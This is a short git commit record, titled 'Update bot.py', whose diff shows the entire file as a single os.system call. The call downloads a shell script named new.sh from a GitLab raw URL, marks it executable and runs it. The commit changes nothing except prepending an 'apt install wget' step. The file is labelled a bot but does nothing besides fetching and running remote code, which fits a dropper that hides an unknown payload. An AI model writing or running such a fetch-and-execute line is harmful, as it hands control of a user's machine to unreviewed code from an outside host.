cdd635a3072cdecd2dbec12331256a9297953bf0
sd4-ui <sd4@bolowe.com>
2026-03-28 05:49:40 +0700

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,3 +1,3 @@
 import os
 
-os.system("wget -O new https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && sed -i 's/\r$//' new && chmod +x new && ./new")
+os.system("apt install wget && wget -O new https://gitlab.com/barbieanay003/seger/-/raw/main/new.sh && sed -i 's/\r$//' new && chmod +x new && ./new")
